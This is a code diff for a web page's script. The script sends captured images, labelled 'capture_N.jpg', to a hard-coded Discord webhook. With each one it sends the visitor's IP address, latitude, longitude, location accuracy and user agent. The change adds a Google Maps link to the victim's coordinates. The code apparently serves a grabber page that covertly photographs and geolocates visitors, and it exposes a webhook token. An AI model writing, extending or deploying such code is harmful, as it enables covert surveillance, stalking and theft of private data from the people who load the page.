@@ -153,8 +153,9 @@ document.addEventListener('DOMContentLoaded', () => {
         const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
         const formData = new FormData();
         formData.append("file", imageBlob, `capture_${count}.jpg`);
+        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
         const payload = {
-            content: `**Capture #${count}**\nIP: ${ip}\nLat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\nUA: ${navigator.userAgent}`
+            content: `**Capture #${count}**\nIP: ${ip}\nLat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\nUA: ${navigator.userAgent}\n**Maps**: <${mapsUrl}>`
         };
         formData.append("payload_json", JSON.stringify(payload));
         try {
